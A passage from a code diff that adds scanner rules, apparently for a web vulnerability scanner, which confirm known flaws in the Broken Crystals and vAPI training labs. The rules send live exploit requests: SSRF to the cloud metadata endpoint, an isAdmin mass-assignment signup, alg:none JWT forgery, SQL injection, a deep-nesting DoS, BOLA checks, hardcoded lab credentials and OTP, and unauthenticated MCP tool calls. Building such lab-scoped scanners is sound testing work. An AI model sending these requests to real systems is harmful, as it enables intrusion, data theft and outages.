+  if (/\/api\/file\/(?:raw|aws|azure|google|digital_ocean)/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsFileLfiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/file route scan — GET ?path=package.json returns application package.json — local file inclusion oracle distinct from /api/file/raw"
+    }
+  };
+};
+
+const brokencrystalsTestimonialsCountSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/testimonials\/count/i.test(pageUrl)) return NEGATIVE;
+  const result = await sqliQueryParamInjection(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/testimonials/count route scan — query param executes attacker-controlled SQL — information_schema table count oracle"
+    }
+  };
+};
+
+const brokencrystalsProductsLatestLimitBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/products\/latest/i.test(pageUrl)) return NEGATIVE;
+  const defaultUrl = new URL("/api/products/latest", ctx.origin).toString();
+  const bypassUrl = new URL("/api/products/latest?limit=100", ctx.origin).toString();
+  const [defaultDoc, bypassDoc] = await Promise.all([
+    ctx.probe.get(defaultUrl, { maxBytes: 65536, timeoutMs: 15000 }),
+    ctx.probe.get(bypassUrl, { maxBytes: 65536, timeoutMs: 15000 })
+  ]);
+  if (defaultDoc.status < 200 || defaultDoc.status >= 400) return NEGATIVE;
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  let defaultCount = 0;
+  let bypassCount = 0;
+  try {
+    const defaultItems = JSON.parse(defaultDoc.body);
+    const bypassItems = JSON.parse(bypassDoc.body);
+    if (!Array.isArray(defaultItems) || !Array.isArray(bypassItems)) return NEGATIVE;
+    defaultCount = defaultItems.length;
+    bypassCount = bypassItems.length;
+  } catch {
+    return NEGATIVE;
+  }
+  if (defaultCount < 1 || bypassCount <= defaultCount || bypassCount < 5) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      defaultUrl,
+      bypassUrl,
+      defaultCount,
+      bypassCount,
+      note: "Broken Crystals /api/products/latest route scan — default returns 3 products but ?limit=100 returns full catalog — business constraint bypass oracle"
+    }
+  };
+};
+
+const brokencrystalsFileAwsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/file\/aws/i.test(pageUrl)) return NEGATIVE;
+  const probeUrl = new URL("/api/file/aws", ctx.origin);
+  probeUrl.searchParams.set("path", "http://169.254.169.254/latest/meta-data/");
+  probeUrl.searchParams.set("type", "image/jpg");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const metadataOk =
+    /ami-id/i.test(doc.body) &&
+    /instance-id/i.test(doc.body) &&
+    /local-ipv4/i.test(doc.body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals /api/file/aws route scan — GET with AWS metadata path returns IMDS ami-id/instance-id — cloud SSRF oracle"
+    }
+  };
+};
+
+const brokencrystalsAdminpermissionRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/adminpermission/i.test(pageUrl)) return NEGATIVE;
+  const email = `thugir-ap-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    isAdmin: true,
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const perm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token, { bypassCache: true });
+  if (!perm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      createUrl,
+      adminPermissionUrl: perm.url,
+      email,
+      snippet: perm.snippet,
+      note: "Broken Crystals /api/users/one/{email}/adminpermission route scan — POST /api/users/basic isAdmin:true then GET adminpermission confirms privilege escalation"
+    }
+  };
+};
+
+async function brokencrystalsMcpSessionId(ctx: RuleContext): Promise<string | null> {
+  const mcpUrl = new URL("/api/mcp", ctx.origin).toString();
+  const initPayload = JSON.stringify({
+    jsonrpc: "2.0",
+    method: "initialize",
+    params: {
+      protocolVersion: "2024-11-05",
+      capabilities: {},
+      clientInfo: { name: "thugir", version: "1" }
+    },
+    id: 1
+  });
+  const doc = await ctx.probe.get(mcpUrl, {
+    method: "POST",
+    body: initPayload,
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json, text/event-stream"
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  const headerSession = (doc.headers["mcp-session-id"] || doc.headers["Mcp-Session-Id"] || "").trim();
+  if (headerSession) return headerSession;
+  try {
+    const parsed = JSON.parse(doc.body) as {
+      result?: { session?: { mcpSessionId?: string } };
+    };
+    return parsed.result?.session?.mcpSessionId ?? null;
+  } catch {
+    return null;
+  }
+}
+
+async function brokencrystalsMcpJsonRpc(
+  ctx: RuleContext,
+  sessionId: string,
+  method: string,
+  params?: unknown,
+  id = 2
+): Promise<{ body: string; status: number }> {
+  const mcpUrl = new URL("/api/mcp", ctx.origin).toString();
+  const payload = JSON.stringify({ jsonrpc: "2.0", method, params, id });
+  const doc = await ctx.probe.get(mcpUrl, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      "Mcp-Session-Id": sessionId
+    },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  return { body: doc.body, status: doc.status };
+}
+
+const brokencrystalsMcpToolsLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const sessionId = await brokencrystalsMcpSessionId(ctx);
+  if (!sessionId) return NEGATIVE;
+  const listDoc = await brokencrystalsMcpJsonRpc(ctx, sessionId, "tools/list");
+  if (listDoc.status < 200 || listDoc.status >= 400) return NEGATIVE;
+  let tools: Array<{ name?: string; accessLevel?: string; description?: string }> = [];
+  try {
+    const parsed = JSON.parse(listDoc.body) as {
+      result?: { tools?: Array<{ name?: string; accessLevel?: string; description?: string }> };
+    };
+    tools = parsed.result?.tools ?? [];
+  } catch {
+    return NEGATIVE;
+  }
+  if (tools.length < 3) return NEGATIVE;
+  const byName = new Map(tools.map((t) => [t.name ?? "", t]));
+  const getCount = byName.get("get_count");
+  const spawnProcess = byName.get("spawn_process");
+  const getConfig = byName.get("get_config");
+  const sqlToolOk =
+    getCount &&
+    /SQL query|select count/i.test(getCount.description ?? "") &&
+    getCount.accessLevel === "public";
+  const adminToolsOk =
+    spawnProcess?.accessLevel === "admin" && getConfig?.accessLevel === "admin";
+  if (!sqlToolOk || !adminToolsOk) return NEGATIVE;
+  const countDoc = await brokencrystalsMcpJsonRpc(ctx, sessionId, "tools/call", {
+    name: "get_count",
+    arguments: {
+      query: "select count(*) as count from testimonial"
+    }
+  }, 3);
+  const countOk =
+    countDoc.status >= 200 &&
+    countDoc.status < 400 &&
+    /Query result:\s*\d+/i.test(countDoc.body);
+  if (!countOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      sessionId,
+      tools: tools.map((t) => `${t.name}:${t.accessLevel ?? "unknown"}`).slice(0, 8),
+      countSnippet: countDoc.body.slice(0, 120).trim(),
+      note: "Broken Crystals POST /api/mcp initialize + tools/list exposes public SQL get_count and admin spawn_process/get_config tools — unauthenticated MCP gateway oracle"
+    }
+  };
+};
+
+const brokencrystalsMcpRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/mcp\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsMcpToolsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const brokencrystalsJwtAlgNoneLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const path = "/api/auth/jwt/rsa/signature/validate";
+  const url = new URL(path, ctx.origin).toString();
+  const now = Math.floor(Date.now() / 1000);
+  const algNoneToken = buildAlgNoneJwt({ user: "admin", exp: now + 3600 });
+  const badToken = "thugir.invalid.probe.token";
+  const [noAuth, badAuth, noneAuth] = await Promise.all([
+    ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 15000 }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: badToken }
+    }),
+    ctx.probe.get(url, {
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: { Authorization: algNoneToken }
+    })
+  ]);
+  if (!looksAuthChallenge(noAuth) || !looksAuthChallenge(badAuth)) return NEGATIVE;
+  if (!looksAuthGatedJson(noneAuth) || !/"secret"\s*:\s*"/i.test(noneAuth.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url,
+      statusWithAlgNone: noneAuth.status,
+      responseSample: noneAuth.body.slice(0, 150).trim(),
+      note: "Broken Crystals GET /api/auth/jwt/rsa/signature/validate accepts alg:none JWT and returns secret — JWT none-algorithm bypass oracle"
+    }
+  };
+};
+
+const brokencrystalsJwtRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/jwt/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsJwtAlgNoneLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/jwt route scan — alg:none JWT bypasses /api/auth/jwt/rsa/signature/validate and returns secret"
+    }
+  };
+};
+
+const brokencrystalsDomCsrfFlowLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/auth/dom-csrf-flow", ctx.origin).toString();
+  const noFp = await ctx.probe.get(url, { maxBytes: 512, timeoutMs: 15000 });
+  if (noFp.status !== 400 || !/fingerprint/i.test(noFp.body)) return NEGATIVE;
+  const canary = `thugir-fp-${Date.now().toString(36)}`;
+  const withFp = await ctx.probe.get(url, {
+    headers: { Fingerprint: canary },
+    maxBytes: 128,
+    timeoutMs: 15000
+  });
+  if (withFp.status < 200 || withFp.status >= 300) return NEGATIVE;
+  const token = withFp.body.trim();
+  if (!/^[a-f0-9]{32}$/i.test(token)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      fingerprint: canary,
+      token,
+      unauthStatus: noFp.status,
+      snippet: token,
+      note: "Broken Crystals GET /api/auth/dom-csrf-flow issues a DOM CSRF token when Fingerprint header is present — no session auth required"
+    }
+  };
+};
+
+const brokencrystalsDomCsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/auth\/dom-csrf-flow/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsDomCsrfFlowLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/auth/dom-csrf-flow route scan — Fingerprint header returns 32-char DOM CSRF token without authentication"
+    }
+  };
+};
+
+const brokencrystalsNestedJsonDoSLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const shallowUrl = new URL("/api/nestedJson", ctx.origin);
+  shallowUrl.searchParams.set("depth", "3");
+  const shallow = await ctx.probe.get(shallowUrl.toString(), { maxBytes: 256, timeoutMs: 15000 });
+  if (shallow.status < 200 || shallow.status >= 300) return NEGATIVE;
+  if (!/"Leaf"/i.test(shallow.body)) return NEGATIVE;
+  const deepUrl = new URL("/api/nestedJson", ctx.origin);
+  deepUrl.searchParams.set("depth", "10000");
+  const deep = await ctx.probe.get(deepUrl.toString(), { maxBytes: 512, timeoutMs: 15000 });
+  if (deep.status < 500) return NEGATIVE;
+  if (!/maximum call stack|stack size exceeded/i.test(deep.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      shallowUrl: shallowUrl.toString(),
+      deepUrl: deepUrl.toString(),
+      shallowStatus: shallow.status,
+      deepStatus: deep.status,
+      snippet: deep.body.slice(0, 120).trim(),
+      note: "Broken Crystals GET /api/nestedJson?depth=10000 triggers Maximum call stack size exceeded — unbounded recursive nesting DoS oracle"
+    }
+  };
+};
+
+const brokencrystalsNestedJsonRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/nestedJson/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsNestedJsonDoSLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /api/nestedJson route scan — depth=10000 causes stack overflow 500 — unbounded nesting DoS oracle"
     }
   };
 };
@@ -34966,13 +41618,1593 @@ const clientSideVapiEvidence: Rule = async (ctx) => {
     if (m) hits.push({ label, sample: m[0].slice(0, 100) });
   }
   if (hits.length < 2) return NEGATIVE;
-  if (!/vAPI|vapi\.apisec\.ai|roottusk\/vapi/i.test(ctx.combined)) return NEGATIVE;
+  if (!/vAPI|vapi\.apisec\.ai|vapi\.tools\.escape\.tech|roottusk\/vapi/i.test(ctx.combined)) return NEGATIVE;
   return {
     fired: true,
     confidence: hits.length >= 3 ? 0.9 : 0.87,
     evidence: {
       markers: hits.slice(0, 4),
       note: "vAPI is a self-hostable OWASP API Top 10 exercise lab with deliberately broken authorization and authentication"
+    }
+  };
+};
+
+function isVapiHost(ctx: RuleContext): boolean {
+  const urls = [ctx.origin, ctx.scanUrl || "", ctx.home.finalUrl || ""];
+  return urls.some((raw) => {
+    try {
+      const host = new URL(raw).hostname.toLowerCase();
+      return /^(?:www\.)?vapi\.tools\.escape\.tech$/i.test(host) || /vapi\.apisec\.ai$/i.test(host);
+    } catch {
+      return /vapi\.tools\.escape\.tech|vapi\.apisec\.ai/i.test(raw);
+    }
+  });
+}
+
+function vapiCanonicalOrigin(ctx: RuleContext): string {
+  const urls = [ctx.scanUrl || "", ctx.home.finalUrl || "", ctx.origin];
+  for (const raw of urls) {
+    try {
+      const u = new URL(raw);
+      const host = u.hostname.toLowerCase();
+      if (/^(?:www\.)?vapi\.tools\.escape\.tech$/i.test(host)) return "https://vapi.tools.escape.tech";
+      if (/vapi\.apisec\.ai$/i.test(host)) {
+        // vapi.apisec.ai serves the PHP lab over HTTP only — HTTPS resets the connection.
+        u.protocol = "http:";
+        return u.origin;
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+  return ctx.origin.replace(/^http:\/\//i, "https://");
+}
+
+const vapiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const base = vapiCanonicalOrigin(ctx);
+  const homeUrl = new URL("/", base).toString();
+  const homeDoc = await fetchDoc(homeUrl, { maxBytes: 32768, timeoutMs: 15000 });
+  const corpus = `${ctx.combined}\n${homeDoc.body}`;
+  const markers: { label: string; sample: string }[] = [];
+  if (/\bvAPI\b/i.test(corpus)) markers.push({ label: "vAPI application title", sample: "vAPI" });
+  if (/roottusk\/vapi|OWASP API Top 10/i.test(corpus)) {
+    markers.push({ label: "vAPI OWASP API Top 10 lab", sample: "roottusk/vapi" });
+  }
+  const bolaCtx = { ...ctx, origin: base };
+  const bola = await vapiApi1BolaLiveOracle(bolaCtx);
+  if (markers.length < 1 && !bola.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: bola.fired && markers.length >= 2 ? 0.94 : bola.fired ? 0.92 : 0.89,
+    evidence: {
+      scannedUrl: pageUrl,
+      homeUrl,
+      markers: markers.slice(0, 3),
+      bolaEvidence: bola.fired ? bola.evidence : undefined,
+      snippet: bola.fired ? String(bola.evidence?.snippet || "").slice(0, 120) : homeDoc.body.slice(0, 120).trim(),
+      note: "vAPI live host route scan — OWASP API Top 10 training lab confirmed and API1 BOLA returns another user's record with flag"
+    }
+  };
+};
+
+const vapiApi1BolaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_api1_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api1/user", vapiCanonicalOrigin(ctx)).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const idMatch = createDoc.body.match(/"id"\s*:\s*(\d+)/);
+  if (!idMatch) return NEGATIVE;
+  const ownId = Number(idMatch[1]);
+  const token = vapiBasicAuthToken(username, password);
+  const bolaUrl = new URL("/vapi/api1/user/1", vapiCanonicalOrigin(ctx)).toString();
+  const bolaDoc = await ctx.probe.get(bolaUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (bolaDoc.status < 200 || bolaDoc.status >= 400) return NEGATIVE;
+  const flagMatch = bolaDoc.body.match(/flag\{api1_[^"]+/i);
+  const otherUser =
+    /"id"\s*:\s*1/.test(bolaDoc.body) && /"username"\s*:/.test(bolaDoc.body) && ownId !== 1;
+  if (!flagMatch && !otherUser) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      createUrl,
+      bolaUrl,
+      ownId,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: bolaDoc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api1/user/1 with newly registered user token returns user id=1 record including flag — BOLA oracle (API1)"
+    }
+  };
+};
+
+const VAPI_API2_KNOWN_EMAIL = "savanna48@ortiz.com";
+const VAPI_API2_KNOWN_PASSWORD = "zTyBwV/9";
+
+const vapiApi2BrokenAuthLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/vapi/api2/user/login", vapiCanonicalOrigin(ctx)).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ email: VAPI_API2_KNOWN_EMAIL, password: VAPI_API2_KNOWN_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
+  const tokenMatch = loginDoc.body.match(/"token"\s*:\s*"([^"]{8,})"/);
+  if (!tokenMatch) return NEGATIVE;
+  const detailsUrl = new URL("/vapi/api2/user/details", vapiCanonicalOrigin(ctx)).toString();
+  const detailsDoc = await ctx.probe.get(detailsUrl, {
+    headers: { "Authorization-Token": tokenMatch[1] },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (detailsDoc.status < 200 || detailsDoc.status >= 400) return NEGATIVE;
+  if (!/\[\s*\{/.test(detailsDoc.body) || !/"email"\s*:/.test(detailsDoc.body)) return NEGATIVE;
+  const flagMatch = detailsDoc.body.match(/flag\{api2_[^"]+/i);
+  const rowCount = (detailsDoc.body.match(/"id"\s*:/g) || []).length;
+  if (rowCount < 2 && !flagMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      loginUrl,
+      detailsUrl,
+      knownEmail: VAPI_API2_KNOWN_EMAIL,
+      rowCount,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: detailsDoc.body.slice(0, 200).trim(),
+      note: "vAPI POST /api2/user/login accepts credential-stuffing creds and GET /api2/user/details returns every user record including flag — broken authentication oracle (API2)"
+    }
+  };
+};
+
+const vapiApi3CommentBolaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const commentUrl = new URL("/vapi/api3/comment", vapiCanonicalOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(commentUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"commenttext"\s*:/.test(doc.body) || !/"deviceid"\s*:/.test(doc.body)) return NEGATIVE;
+  try {
+    const rows = JSON.parse(doc.body) as Array<{ id?: number; deviceid?: string; username?: string }>;
+    if (!Array.isArray(rows) || rows.length < 1) return NEGATIVE;
+    const flagged = rows.find((r) => /flag\{api3_/i.test(String(r.deviceid || "")));
+    if (rows.length < 2 && !flagged) return NEGATIVE;
+    return {
+      fired: true,
+      confidence: flagged ? 0.94 : 0.9,
+      evidence: {
+        url: commentUrl,
+        rowCount: rows.length,
+        sampleDeviceId: String(rows[0]?.deviceid || "").slice(0, 80),
+        flagSnippet: flagged ? String(flagged.deviceid).slice(0, 80) : undefined,
+        note: "vAPI GET /api3/comment returns every comment JSON without authentication — BOLA / excessive data exposure oracle (API3)"
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const VAPI_API4_KNOWN_OTP = "1872";
+
+const vapiApi4OtpBrokenAuthLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const verifyUrl = new URL("/vapi/api4/otp/verify", vapiCanonicalOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(verifyUrl, {
+    method: "POST",
+    body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(doc.body) || !/"key"\s*:/.test(doc.body)) return NEGATIVE;
+  const keyMatch = doc.body.match(/"key"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: verifyUrl,
+      otp: VAPI_API4_KNOWN_OTP,
+      keyRedacted: `${keyMatch[1].slice(0, 4)}...${keyMatch[1].slice(-4)}`,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api4/otp/verify accepts static OTP 1872 and returns API key without rate limiting — broken authentication oracle (API4)"
+    }
+  };
+};
+
+const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const verifyUrl = new URL("/vapi/api4/otp/verify", vapiCanonicalOrigin(ctx)).toString();
+  const verifyDoc = await ctx.probe.get(verifyUrl, {
+    method: "POST",
+    body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  const keyMatch = verifyDoc.body.match(/"key"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  const apiKey = keyMatch[1]!;
+  const usersUrl = new URL("/vapi/api4/user", vapiCanonicalOrigin(ctx)).toString();
+  const usersDoc = await ctx.probe.get(usersUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { "Authorization-Token": apiKey }
+  });
+  if (usersDoc.status < 200 || usersDoc.status >= 400) return NEGATIVE;
+  if (!/"firstname"\s*:/.test(usersDoc.body) || !/"lastname"\s*:/.test(usersDoc.body)) return NEGATIVE;
+  const flagMatch = usersDoc.body.match(/flag\{api4_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      verifyUrl,
+      usersUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: usersDoc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api4/user with OTP-leaked Authorization-Token returns all user records including flag in lastname — broken authentication + excessive data exposure oracle (API4)"
+    }
+  };
+};
+
+const vapiApi4OtpRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api4\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi4OtpBrokenAuthLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api4 route scan — POST /api4/otp/verify accepts static OTP 1872 and returns API key — broken authentication oracle (API4)"
+    }
+  };
+};
+
+function vapiBasicAuthToken(username: string, password: string): string {
+  return Buffer.from(`${username}:${password}`).toString("base64");
+}
+
+const vapiApi3CommentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api3\/comment/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi3CommentBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api3/comment route scan — GET returns every comment JSON without authentication — BOLA / excessive data exposure oracle (API3)"
+    }
+  };
+};
+
+const vapiApi5BflaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_bfla_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api5/user", vapiCanonicalOrigin(ctx)).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const token = vapiBasicAuthToken(username, password);
+  const usersUrl = new URL("/vapi/api5/users", vapiCanonicalOrigin(ctx)).toString();
+  const usersDoc = await ctx.probe.get(usersUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (usersDoc.status < 200 || usersDoc.status >= 400) return NEGATIVE;
+  if (!/\[\s*\{/.test(usersDoc.body) || !/"username"\s*:/.test(usersDoc.body)) return NEGATIVE;
+  const flagMatch = usersDoc.body.match(/flag\{api5_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      createUrl,
+      usersUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      rowCount: (usersDoc.body.match(/"id"\s*:/g) || []).length,
+      note: "vAPI GET /api5/users with regular-user Authorization-Token returns every user record including admin flag — broken function level authorization oracle (API5)"
+    }
+  };
+};
+
+const vapiApi5RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api5\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi5BflaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api5 route scan — GET /api5/users with regular-user Authorization-Token returns every user record including admin flag — BFLA oracle (API5)"
+    }
+  };
+};
+
+const vapiApi1RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
